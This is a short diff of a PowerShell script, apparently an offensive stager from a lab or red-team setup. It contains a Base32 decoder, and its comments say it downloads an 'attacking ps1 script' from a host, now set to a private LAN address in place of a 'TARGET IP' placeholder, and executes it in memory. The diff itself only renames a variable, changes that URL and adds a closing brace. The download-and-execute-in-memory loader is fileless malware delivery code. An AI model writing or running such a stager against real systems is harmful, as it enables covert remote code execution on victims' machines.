@@ -5,14 +5,14 @@ function Decode-Base32 {
         [string]$EncodedText
     )
 
-    $base32chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
+    $encodedChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
     $byteOutput = New-Object byte[]([math]::ceiling($EncodedText.Length * 5 / 8))
     $byteCount = 0
     $buffer = 0
     $bitsRemaining = 0
 
     foreach ($c in $EncodedText.ToUpper().ToCharArray()) {
-        $value = [array]::IndexOf($base32chars.ToCharArray(), $c)
+        $value = [array]::IndexOf($EncodedChars.ToCharArray(), $c)
         if ($value -eq -1) {
             throw "Invalid Base32 character '$c'"
         }
@@ -34,7 +34,7 @@ function Decode-Base32 {
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 
 # Specify URL from which attacking ps1 script is downloaded
-$fileUrl = "https://TARGET IP/Penguin32.txt"
+$fileUrl = "http://192.168.0.20/Penguin32.txt"
 
 # DL the file and execute it on memory
 try {
@@ -54,3 +54,4 @@ catch {
 }
 finally {
     $webClient.Dispose()
+}
